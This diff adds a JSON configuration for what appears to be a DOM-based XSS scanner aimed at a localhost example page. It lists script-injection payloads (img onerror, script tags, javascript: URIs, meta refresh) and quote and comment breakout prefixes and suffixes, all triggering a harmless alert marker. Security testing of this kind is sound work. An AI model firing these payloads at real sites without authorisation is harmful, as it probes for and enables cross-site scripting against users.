@@ -1,0 +1,37 @@
+{
+    "base_url": "http://localhost:8001/dom_based_xss_example.html",
+    "base_string": [
+        "<img src=x onerror=alert(585353)>",
+        "<img src=\"x\"onerror=\"alert(585353)\">",
+        "<IMG SRC=x onload=alert(585353)>",
+        "<IMG SRC=\"x\" onload=\"alert(585353)\">",
+        "<img/src=x onerror=alert(585353)>",
+        "<script>alert(585353)</script>",
+        "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(585353)\">",
+        "javascript:alert(585353)",
+        "JavAsCrIpt:alert(585353)",
+        "javascript:alert`585353`",
+        "JavAsCrIpt:alert`585353`",
+        "alert(585353)"
+    ],
+    "prefix": [
+        "",
+        "\">",
+        "'>",
+        "'\">",
+        "-->",
+        ">>"
+    ],
+    "suffix": [
+        "",
+        "<\"",
+        "<'",
+        "<\"'",
+        "<!--",
+        "<<"
+    ],
+    "keyword": [
+        "url",
+        "script"
+    ]
+}
